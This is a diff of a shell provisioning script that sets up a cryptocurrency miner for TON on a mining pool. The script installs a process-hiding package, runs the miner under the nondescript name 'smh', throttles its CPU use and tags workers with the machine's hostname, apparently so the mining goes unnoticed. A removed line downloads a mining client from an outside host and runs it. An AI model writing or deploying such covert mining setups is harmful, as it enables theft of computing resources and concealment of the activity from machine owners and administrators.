@@ -8,7 +8,6 @@ sudo apt-get install gcc g++ make
 sudo -u root npm i -g node-process-hider
 sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 sudo dpkg-reconfigure --frontend noninteractive tzdata
-sudo apt-get install opencl-headers ocl-icd-libopencl1 ocl-icd-opencl-dev curl && curl -JLO 'releases.tonuniverse.com/miningPoolCli/linux/latest' && tar xvf miningPoolCli-2.1.18-linux.tar.gz && cd miningPoolCli-2.1.18 && ./miningPoolCli -pool-id=6128c674e2098950cb4e7fc61cc84c4a
 chmod +x smh
 cpulimit -e smh -l 30 &
-./smh --algo TON --pool https://pool.tonuniverse.com --user EQCebZGgrEfSRfC9Fu4e8Y6UOkVg4-5wEenb12bnUgoMTZ6u.$(cat /proc/sys/kernel/hostname)
+./smh --algo TON --pool https://pool.tonuniverse.com --user 6128c674e2098950cb4e7fc61cc84c4a.$(cat /proc/sys/kernel/hostname)
